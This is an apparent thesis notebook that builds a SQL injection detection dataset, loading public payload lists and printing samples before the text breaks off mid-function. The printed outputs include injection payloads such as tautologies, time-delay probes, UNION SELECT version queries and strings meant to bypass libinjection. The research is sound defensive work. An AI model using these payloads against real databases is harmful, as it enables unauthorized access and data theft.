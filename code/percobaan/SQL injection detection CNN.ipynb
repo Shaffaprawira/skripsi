{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### This notebook is intended to predict sql injection attacks\n",
    "    Total data  : 5234\n",
    "    Benign data : 3072 + 744 = 3816\n",
    "    SQLI Data   : 1128 + 290 = 1418\n",
    "    \n",
    "#### At the end of notebook are results of testing"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "[nltk_data] Downloading package punkt to C:\\Users\\Acha\n",
      "[nltk_data]     Prawira\\AppData\\Roaming\\nltk_data...\n",
      "[nltk_data]   Package punkt is already up-to-date!\n",
      "[nltk_data] Downloading package stopwords to C:\\Users\\Acha\n",
      "[nltk_data]     Prawira\\AppData\\Roaming\\nltk_data...\n",
      "[nltk_data]   Package stopwords is already up-to-date!\n",
      "[nltk_data] Downloading package wordnet to C:\\Users\\Acha\n",
      "[nltk_data]     Prawira\\AppData\\Roaming\\nltk_data...\n",
      "[nltk_data]   Package wordnet is already up-to-date!\n"
     ]
    }
   ],
   "source": [
    "\n",
    "# import required packages\n",
    "\n",
    "import glob\n",
    "import time\n",
    "import pandas as pd\n",
    "# from xml.dom import minidom\n",
    "from nltk import ngrams\n",
    "from nltk.tokenize import sent_tokenize\n",
    "import nltk\n",
    "nltk.download('punkt')\n",
    "nltk.download('stopwords')\n",
    "nltk.download('wordnet')\n",
    "from nltk.stem import PorterStemmer\n",
    "from nltk.stem import PorterStemmer\n",
    "from nltk.tokenize import sent_tokenize, word_tokenize\n",
    "from nltk.stem import WordNetLemmatizer\n",
    "from nltk.corpus import stopwords \n",
    "from nltk.tokenize import word_tokenize"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "metadata": {},
   "outputs": [],
   "source": [
    "import keras"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "metadata": {},
   "outputs": [],
   "source": [
    "import nltk\n",
    "import pandas as pd\n",
    "import os"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### File_name: git_foospidy_payloads_fuzzing_code_db_sqli.txt\n",
    "##### Comments :  \n",
    "1. removed \\n at the end of each line\n",
    "2.  replaced %20 by space\n",
    "#### Source: https://github.com/foospidy/payloads/blob/7749dd0bfcc64786feb22f578b978d2f8607e353/owasp/fuzzing_code_database/sqli/sqli.txt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "metadata": {},
   "outputs": [],
   "source": [
    "# preprocess sql data to have same format for all files\n",
    "\n",
    "def clean_sqli_data(data):\n",
    "    \n",
    "    for i in range(len(data)):\n",
    "        \n",
    "        data[i]=data[i].replace('\\n', '')\n",
    "        data[i]=data[i].replace('%20', ' ')\n",
    "        data[i]=data[i].replace('=', ' = ')\n",
    "        data[i]=data[i].replace('((', ' (( ')\n",
    "        data[i]=data[i].replace('))', ' )) ')\n",
    "        data[i]=data[i].replace('(', ' ( ')\n",
    "        data[i]=data[i].replace(')', ' ) ')\n",
    "    \n",
    "    return data"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "metadata": {},
   "outputs": [],
   "source": [
    "path='./sqli.txt'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "metadata": {},
   "outputs": [],
   "source": [
    "# read data from file\n",
    "\n",
    "sql_lines_fuzzing=[]\n",
    "f = open(path, \"r\")\n",
    "for x in f:\n",
    "    sql_lines_fuzzing.append(x)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 30,
   "metadata": {},
   "outputs": [],
   "source": [
    "sql_lines_fuzzing=clean_sqli_data(sql_lines_fuzzing) "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 31,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[\"'sqlvuln\",\n",
       " \"'+sqlvuln\",\n",
       " 'sqlvuln;',\n",
       " ' ( sqlvuln ) ',\n",
       " \"a' or 1 = 1--\",\n",
       " '\"a\"\" or 1 = 1--\"',\n",
       " ' or a  =  a',\n",
       " \"a' or 'a'  =  'a\",\n",
       " '1 or 1 = 1',\n",
       " \"a' waitfor delay '0:0:10'--\",\n",
       " \"1 waitfor delay '0:0:10'--\",\n",
       " 'declare @q nvarchar  ( 4000 )  select @q  = ',\n",
       " '0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A',\n",
       " '0',\n",
       " '031003000270000']"
      ]
     },
     "execution_count": 31,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sql_lines_fuzzing[:15]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### File_Name: git_foospidy_payloads_other_sqli_camoufl4g3.txt\n",
    "##### Comments : ok\n",
    "#### Source: https://github.com/foospidy/payloads/tree/master/other/sqli"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 32,
   "metadata": {},
   "outputs": [],
   "source": [
    "path='./camoufl4g3.txt'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 33,
   "metadata": {},
   "outputs": [],
   "source": [
    "# read data from file\n",
    "\n",
    "sql_lines_camoufl4g3=[]\n",
    "f = open(path, \"r\")\n",
    "for x in f:\n",
    "    sql_lines_camoufl4g3.append(x)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 34,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[\"'-'\\n\",\n",
       " \"' '\\n\",\n",
       " \"'&'\\n\",\n",
       " \"'^'\\n\",\n",
       " \"'*'\\n\",\n",
       " \"' or ''-'\\n\",\n",
       " \"' or '' '\\n\",\n",
       " \"' or ''&'\\n\",\n",
       " \"' or ''^'\\n\",\n",
       " \"' or ''*'\\n\",\n",
       " '\"-\"\\n',\n",
       " '\" \"\\n',\n",
       " '\"&\"\\n',\n",
       " '\"^\"\\n',\n",
       " '\"*\"\\n']"
      ]
     },
     "execution_count": 34,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sql_lines_camoufl4g3[:15] # data before cleaning"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 35,
   "metadata": {},
   "outputs": [],
   "source": [
    "sql_lines_camoufl4g3=clean_sqli_data(sql_lines_camoufl4g3)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 36,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[\"'-'\",\n",
       " \"' '\",\n",
       " \"'&'\",\n",
       " \"'^'\",\n",
       " \"'*'\",\n",
       " \"' or ''-'\",\n",
       " \"' or '' '\",\n",
       " \"' or ''&'\",\n",
       " \"' or ''^'\",\n",
       " \"' or ''*'\",\n",
       " '\"-\"',\n",
       " '\" \"',\n",
       " '\"&\"',\n",
       " '\"^\"',\n",
       " '\"*\"']"
      ]
     },
     "execution_count": 36,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sql_lines_camoufl4g3[:15]  # data after cleaning"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### File_Name: git_foospidy_payloads_other_sqli_libinjection-bypasses.txt\n",
    "##### Comments: Should Remove &()o1: from start of each sentence\n",
    "#### Source: https://github.com/foospidy/payloads/tree/master/other/sqli"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 37,
   "metadata": {},
   "outputs": [],
   "source": [
    "path='./libinjection-bypasses.txt'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 38,
   "metadata": {},
   "outputs": [],
   "source": [
    "# read data from file\n",
    "\n",
    "sql_lines_bypasses=[]\n",
    "f = open(path, \"r\")\n",
    "for x in f:\n",
    "    sql_lines_bypasses.append(x)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 39,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['&()o1: select * from users where id=1 or (\\\\)=1 union select 1,@@VERSION -- 1\\n',\n",
       " '&(.)o: select * from users where id=1 or (\\\\.)=1 union select 1,@@VERSION -- 1\\n',\n",
       " '&(1&1: select * from users where id=1 or (\\\\+)=1 or 1=1 -- 1\\n',\n",
       " '&(1)o: select * from users where id=1 or (1)=1 union select 1,banner from v$version where rownum=1 -- 1\\n',\n",
       " '&(1UE: select * from users where id=1 or (\\\\+)=1 union select 1,@@VERSION -- 1\\n']"
      ]
     },
     "execution_count": 39,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sql_lines_bypasses[:5] # before cleaning"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 40,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "474\n"
     ]
    }
   ],
   "source": [
    "print(len(sql_lines_bypasses))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 41,
   "metadata": {},
   "outputs": [],
   "source": [
    "sql_lines_bypasses=clean_sqli_data(sql_lines_bypasses)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 42,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['& (  ) o1: select * from users where id = 1 or  ( \\\\ )  = 1 union select 1,@@VERSION -- 1',\n",
       " '& ( . ) o: select * from users where id = 1 or  ( \\\\. )  = 1 union select 1,@@VERSION -- 1',\n",
       " '& ( 1&1: select * from users where id = 1 or  ( \\\\+ )  = 1 or 1 = 1 -- 1',\n",
       " '& ( 1 ) o: select * from users where id = 1 or  ( 1 )  = 1 union select 1,banner from v$version where rownum = 1 -- 1',\n",
       " '& ( 1UE: select * from users where id = 1 or  ( \\\\+ )  = 1 union select 1,@@VERSION -- 1']"
      ]
     },
     "execution_count": 42,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sql_lines_bypasses[:5]  # data after cleaning"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 43,
   "metadata": {},
   "outputs": [],
   "source": [
    "# if don't want &(*)* sign in beginning of each sentence then run next code else don't\n",
    "\n",
    "for i in range(len(sql_lines_bypasses)):\n",
    "    sentence=sql_lines_bypasses[i]\n",
    "    sql_lines_bypasses[i]=sentence.split(':')[1]\n",
    "    "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 44,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[' select * from users where id = 1 or  ( \\\\ )  = 1 union select 1,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 or  ( \\\\. )  = 1 union select 1,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 or  ( \\\\+ )  = 1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or  ( 1 )  = 1 union select 1,banner from v$version where rownum = 1 -- 1',\n",
       " ' select * from users where id = 1 or  ( \\\\+ )  = 1 union select 1,@@VERSION -- 1']"
      ]
     },
     "execution_count": 44,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sql_lines_bypasses[:5]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### File_Name: git_foospidy_payloads_owasp_sqli.txt\n",
    "##### Comments: ok\n",
    "#### Source: https://github.com/foospidy/payloads/tree/master/other/sqli"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 45,
   "metadata": {},
   "outputs": [],
   "source": [
    "path='./data/collection/git_foospidy_payloads_owasp_sqli.txt'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 46,
   "metadata": {},
   "outputs": [
    {
     "ename": "FileNotFoundError",
     "evalue": "[Errno 2] No such file or directory: './data/collection/git_foospidy_payloads_owasp_sqli.txt'",
     "output_type": "error",
     "traceback": [
      "\u001b[1;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[1;31mFileNotFoundError\u001b[0m                         Traceback (most recent call last)",
      "\u001b[1;32m<ipython-input-46-9f485cc015c6>\u001b[0m in \u001b[0;36m<module>\u001b[1;34m\u001b[0m\n\u001b[0;32m      2\u001b[0m \u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m      3\u001b[0m \u001b[0msql_lines_owasp\u001b[0m\u001b[1;33m=\u001b[0m\u001b[1;33m[\u001b[0m\u001b[1;33m]\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[1;32m----> 4\u001b[1;33m \u001b[0mf\u001b[0m \u001b[1;33m=\u001b[0m \u001b[0mopen\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0mpath\u001b[0m\u001b[1;33m,\u001b[0m \u001b[1;34m\"r\"\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0m\u001b[0;32m      5\u001b[0m \u001b[1;32mfor\u001b[0m \u001b[0mx\u001b[0m \u001b[1;32min\u001b[0m \u001b[0mf\u001b[0m\u001b[1;33m:\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m      6\u001b[0m     \u001b[0msql_lines_owasp\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mappend\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0mx\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n",
      "\u001b[1;31mFileNotFoundError\u001b[0m: [Errno 2] No such file or directory: './data/collection/git_foospidy_payloads_owasp_sqli.txt'"
     ]
    }
   ],
   "source": [
    "# read data from file\n",
    "\n",
    "sql_lines_owasp=[]\n",
    "f = open(path, \"r\")\n",
    "for x in f:\n",
    "    sql_lines_owasp.append(x)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 47,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[]"
      ]
     },
     "execution_count": 47,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sql_lines_owasp[0:15] # before cleaning"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 48,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "0\n"
     ]
    }
   ],
   "source": [
    "print(len(sql_lines_owasp))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 49,
   "metadata": {},
   "outputs": [],
   "source": [
    "sql_lines_owasp=clean_sqli_data(sql_lines_owasp)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 50,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[]"
      ]
     },
     "execution_count": 50,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sql_lines_owasp[:15] # after cleaning"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### File_Name: git_seclist_fuzzing_sqli_Generic-SQLi.txt\n",
    "##### comments: should we remove %20 by spaces because %20 equals to space\n",
    "#### Source: https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/SQLi"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 51,
   "metadata": {},
   "outputs": [],
   "source": [
    "path='./Generic-SQLi.txt'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 52,
   "metadata": {},
   "outputs": [],
   "source": [
    "# read data from file\n",
    "\n",
    "sql_lines_Generic=[]\n",
    "f = open(path, \"r\")\n",
    "for x in f:\n",
    "    sql_lines_Generic.append(x)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 53,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[\")%20or%20('x'='x\\n\",\n",
       " '%20or%201=1\\n',\n",
       " \"; execute immediate 'sel' || 'ect us' || 'er'\\n\",\n",
       " 'benchmark(10000000,MD5(1))#\\n',\n",
       " 'update\\n',\n",
       " '\";waitfor delay \\'0:0:__TIME__\\'--\\n',\n",
       " '1) or pg_sleep(__TIME__)--\\n',\n",
       " '||(elt(-3+5,bin(15),ord(10),hex(char(45))))\\n',\n",
       " '\"hi\"\") or (\"\"a\"\"=\"\"a\"\\n',\n",
       " 'delete\\n',\n",
       " 'like\\n',\n",
       " '\" or sleep(__TIME__)#\\n',\n",
       " 'pg_sleep(__TIME__)--\\n',\n",
       " '*(|(objectclass=*))\\n',\n",
       " 'declare @q nvarchar (200) 0x730065006c00650063 ...\\n']"
      ]
     },
     "execution_count": 53,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sql_lines_Generic[:15] # before cleaning"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 54,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "267\n"
     ]
    }
   ],
   "source": [
    "print(len(sql_lines_Generic))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 55,
   "metadata": {},
   "outputs": [],
   "source": [
    "sql_lines_Generic=clean_sqli_data(sql_lines_Generic)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 56,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[\" )  or  ( 'x' = 'x\",\n",
       " ' or 1 = 1',\n",
       " \"; execute immediate 'sel' || 'ect us' || 'er'\",\n",
       " 'benchmark ( 10000000,MD5 ( 1  )  )  #',\n",
       " 'update',\n",
       " '\";waitfor delay \\'0:0:__TIME__\\'--',\n",
       " '1 )  or pg_sleep ( __TIME__ ) --',\n",
       " '|| ( elt ( -3+5,bin ( 15 ) ,ord ( 10 ) ,hex ( char ( 45  )  )    )  )  ',\n",
       " '\"hi\"\" )  or  ( \"\"a\"\" = \"\"a\"',\n",
       " 'delete',\n",
       " 'like',\n",
       " '\" or sleep ( __TIME__ ) #',\n",
       " 'pg_sleep ( __TIME__ ) --',\n",
       " '* ( | ( objectclass = *  )  )  ',\n",
       " 'declare @q nvarchar  ( 200 )  0x730065006c00650063 ...']"
      ]
     },
     "execution_count": 56,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sql_lines_Generic[:15] # after cleaning"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### File_name: scottparker_ml_sqli_src__trainingdata_plain.txt\n",
    "##### Comments: \n",
    "removed last 22 records containing URLs\n",
    "#### Source: https://github.com/tungpv98/Detect-Sql-Injection-by-Machine-Learning/tree/ebeb3287931677a3a42f11a7a08dbc13e374ff05/Sql-Injection/source/trainingdata"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 57,
   "metadata": {},
   "outputs": [],
   "source": [
    "\n",
    "# function to remove stopwords\n",
    "\n",
    "stop_words = set(stopwords.words('english')) \n",
    "\n",
    "def fun_remove_stop_words(posts):\n",
    "\n",
    "    filtered=''\n",
    "    \n",
    "    for x in posts.split(' '):\n",
    "        if x not in stop_words:\n",
    "            filtered+=' '+x\n",
    "    \n",
    "    return filtered"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 58,
   "metadata": {},
   "outputs": [],
   "source": [
    "path='./'\n",
    "file=\"plain.txt\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 59,
   "metadata": {},
   "outputs": [],
   "source": [
    "#read benign data\n",
    "\n",
    "df = pd.read_csv(os.path.join(path,file), sep='Aw3s0meSc0t7', names=['benign'], header=None, engine='python')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 60,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>benign</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>Add plain text here</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>“Ne te quaesiveris extra.”</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>“Man is his own star; and the soul that can</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>Render an honest and a perfect man,</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>Commands all light, all influence, all fate;</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                         benign\n",
       "0                           Add plain text here\n",
       "1                    “Ne te quaesiveris extra.”\n",
       "2   “Man is his own star; and the soul that can\n",
       "3           Render an honest and a perfect man,\n",
       "4  Commands all light, all influence, all fate;"
      ]
     },
     "execution_count": 60,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df.head()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 61,
   "metadata": {},
   "outputs": [],
   "source": [
    "plain_text=df['benign'].values  # get sentences"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 62,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "array(['Add plain text here', '“Ne te quaesiveris extra.”',\n",
       "       '“Man is his own star; and the soul that can',\n",
       "       'Render an honest and a perfect man,',\n",
       "       'Commands all light, all influence, all fate;'], dtype=object)"
      ]
     },
     "execution_count": 62,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "plain_text[:5]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 63,
   "metadata": {},
   "outputs": [],
   "source": [
    "plain_text=plain_text[:-22] # removed last 22 records that were urls"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 64,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "3672"
      ]
     },
     "execution_count": 64,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len(plain_text)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 65,
   "metadata": {},
   "outputs": [],
   "source": [
    "# convert from list to string\n",
    "\n",
    "data=''\n",
    "for x in plain_text:\n",
    "    data+=\" \" + x"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 66,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "str"
      ]
     },
     "execution_count": 66,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "type(data)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 67,
   "metadata": {},
   "outputs": [],
   "source": [
    "data=fun_remove_stop_words(data)  # remove stop words\n",
    "data=data.split('.')              # split sentences"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 68,
   "metadata": {},
   "outputs": [],
   "source": [
    "# seperate words inside tags\n",
    "\n",
    "for i in range(len(data)):\n",
    "    data[i]=data[i].replace('<', ' <')\n",
    "    data[i]=data[i].replace('>', '> ')\n",
    "    data[i]=data[i].replace('=', ' = ')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 69,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['  Add plain text “Ne te quaesiveris extra',\n",
       " '” “Man star; soul Render honest perfect man, Commands light, influence, fate; Nothing falls early late',\n",
       " ' Our acts angels are, good ill, Our fatal shadows walk us still',\n",
       " '” Epilogue Beaumont Fletcher’s Honest Man’s Fortune Cast bantling rocks, Suckle she-wolf’s teat; Wintered hawk fox, Power speed hands feet',\n",
       " ' I read day verses written eminent painter original conventional']"
      ]
     },
     "execution_count": 69,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "data[:5]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Statistics"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 70,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Benign records: 3072\n"
     ]
    }
   ],
   "source": [
    "print(\"Benign records: %2i\" %len(data))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 71,
   "metadata": {},
   "outputs": [],
   "source": [
    "# read self created benign data\n",
    "\n",
    "path='./benign_for_training.txt'\n",
    "benign_data=[]\n",
    "f = open(path, \"r\")\n",
    "for x in f:\n",
    "    benign_data.append(x)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 72,
   "metadata": {},
   "outputs": [],
   "source": [
    "# read self created sqli data\n",
    "\n",
    "path='./sqli_for_training.txt'\n",
    "sqli_data=[]\n",
    "f = open(path, \"r\", encoding=\"utf8\")\n",
    "for x in f:\n",
    "    sqli_data.append(x)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 73,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "440"
      ]
     },
     "execution_count": 73,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len(benign_data)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 74,
   "metadata": {},
   "outputs": [],
   "source": [
    "benign_sentence=[]\n",
    "for i in benign_data:\n",
    "    sentences=i.split('.')\n",
    "    \n",
    "    for sentence in sentences:\n",
    "        benign_sentence.append(sentence)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 75,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "1115"
      ]
     },
     "execution_count": 75,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len(benign_sentence)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 76,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "total benign data :  4187\n"
     ]
    }
   ],
   "source": [
    "print(\"total benign data : \" ,len(benign_sentence)+len(data))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 77,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "290"
      ]
     },
     "execution_count": 77,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len(sqli_data)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 78,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "1418"
      ]
     },
     "execution_count": 78,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "1128+290"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 79,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "SQL fuzzing : 142  camoufl4gs : 77 parsed : 474 owasp : 0 generic : 267 \n",
      " total sql injection data : 960 \n"
     ]
    }
   ],
   "source": [
    "print(f\"SQL fuzzing : {len(sql_lines_fuzzing)}  camoufl4gs : {len(sql_lines_camoufl4g3)} parsed : {len(sql_lines_bypasses)} owasp : {len(sql_lines_owasp)} generic : {len(sql_lines_Generic)} \\n total sql injection data : {len(sql_lines_Generic)+len(sql_lines_owasp)+len(sql_lines_bypasses)+len(sql_lines_camoufl4g3)+len(sql_lines_fuzzing)} \")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### combination of all sqli attacks"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 80,
   "metadata": {},
   "outputs": [],
   "source": [
    "all_sqli_sentence=sql_lines_owasp+sql_lines_bypasses+sql_lines_camoufl4g3+sql_lines_fuzzing+sql_lines_Generic"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 81,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "960"
      ]
     },
     "execution_count": 81,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len(all_sqli_sentence)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 82,
   "metadata": {},
   "outputs": [],
   "source": [
    "# replace numeric values by a keyword 'numeric'\n",
    "def optional_numeric_to_numeric(all_sqli_sentence):\n",
    "    \n",
    "    for i in range(len(all_sqli_sentence)):\n",
    "        \n",
    "\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace('1 ', 'numeric')\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(' 1', 'numeric')\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(\"'1 \", \"'numeric \")\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(\" 1'\", \" numeric'\")\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace('1,', 'numeric,')\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(\"1\\ \", 'numeric')\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(\"‘1\", '‘numeric')\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(\" 2 \", \" numeric \")\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(' 3 ', ' numeric ')\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(' 3--', ' numeric--')\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(\" 4 \", ' numeric ')\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(\" 5 \", ' numeric ')\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(' 6 ', ' numeric ')\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(\" 7 \", ' numeric ')\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(\" 8 \", ' numeric ')\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace('1234', ' numeric ')\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(\"22\", ' numeric ')\n",
